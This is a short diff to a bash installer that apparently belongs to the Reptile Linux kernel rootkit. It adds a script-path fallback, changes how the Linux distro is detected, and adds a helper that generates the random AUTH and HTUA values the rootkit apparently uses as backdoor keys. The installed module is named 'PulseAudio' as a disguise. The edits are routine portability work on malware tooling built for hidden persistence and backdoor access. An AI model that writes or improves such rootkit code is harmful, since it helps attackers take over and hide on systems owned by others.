@@ -6,6 +6,9 @@
 DRIVER="PulseAudio"
 KERNEL_VERSION=$(uname -r)
 PWD="$(cd "$(dirname ${BASH_SOURCE[0]})" && pwd)/"
+if [ $? -ne 0 ]; then
+        PWD="$(cd "$(dirname $0)" && pwd)/"
+fi
 
 function banner {
 	echo -e "\n\e[00;31m############################################################################\e[00m"
@@ -93,16 +96,22 @@ function reptile_init {
         exit
 	}
 
-    for f in $(find /etc -type f -maxdepth 1 \( ! -wholename /etc/os-release ! -wholename /etc/lsb-release -wholename /etc/\*release -o -wholename /etc/\*version \) 2> /dev/null)
+    for f in $(find /etc -type f -maxdepth 1 \( ! -path /etc/os-release ! -path /etc/lsb-release -path /etc/\*release -o -path /etc/\*version \) 2> /dev/null)
     do 
     	SYSTEM=${f:5:${#f}-13}
     done
 
     if [ "$SYSTEM" == "" ]; then
+    	echo -e "Failed to detect Linux distro type\n"
     	exit
     fi
+}
 
-	#perl -MCPAN -e "install String::Unescape"# > /dev/null 2>&1
+function random_gen {
+	RETVAL=$(openssl rand -hex 4)
+	if [ $? -ne 0 ]; then
+		RETVAL=$(cat /dev/urandom | head -c 4 | hexdump '-e"%x"')
+	fi
 }
 
 function config_gen {
@@ -179,8 +188,10 @@ EOF
 	START="/"$MODULE"/"$MODULE"_start"
 	TAGIN="#<$TAG>"
 	TAGOUT="#</$TAG>"
-	AUTH=0x$(openssl rand -hex 4)
-	HTUA=0x$(openssl rand -hex 4)
+	random_gen
+	AUTH=0x"$RETVAL"
+	random_gen
+	HTUA=0x"$RETVAL"
 
 	cat > config.script <<EOF
 #ifndef _CONFIG_H
